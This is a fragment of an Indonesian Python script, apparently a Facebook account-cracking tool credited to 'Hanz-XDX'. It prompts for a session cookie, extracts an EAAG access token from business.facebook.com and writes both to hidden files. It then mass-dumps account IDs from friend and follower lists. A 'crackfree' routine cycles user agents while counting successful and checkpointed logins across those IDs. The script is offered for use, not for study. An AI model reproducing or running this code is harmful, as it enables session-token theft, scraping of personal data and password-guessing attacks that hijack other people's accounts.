...
╔══o00════════00o═════════════════════════╗═════════════════╝
{u}█[•] AUTHOR   :Hanz-XDX                   █
█[•] CODE BY  :ALVINO ADIJAYA             █
█[•] GRUP HEX :ANONYMOUSE                 █{x}
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t               [MASUKAN KUE ANDA]'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'      [{b}•{x}]  Masukkan Cookies{x} :{u} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{u} LOGIN BERHASIL....!!!!{x} ');time.sleep(1)
		print(f'  {x}[{h}•{x}]{u} JALANKAN ULANG SCRIPNYA  python nm.py{x}  ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	hanz_xy(f'{u}({x}{k}✓{x}{u}) ID ANDA : '+str(my_id))
	hanz_xy(f'{u}({x}{k}✓{x}{u}) IP ANDA  :{ip} ')
	print('')
...
def dump_massal():
	...
	try:
		print('')
		print(f'(✓) TOTAL ID YANG TERKUMPUL🔥{u}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		...
		print(f'[x]{k} PERTEMANAN TIDAK PUBLIK {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[HANZ-XDX] {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
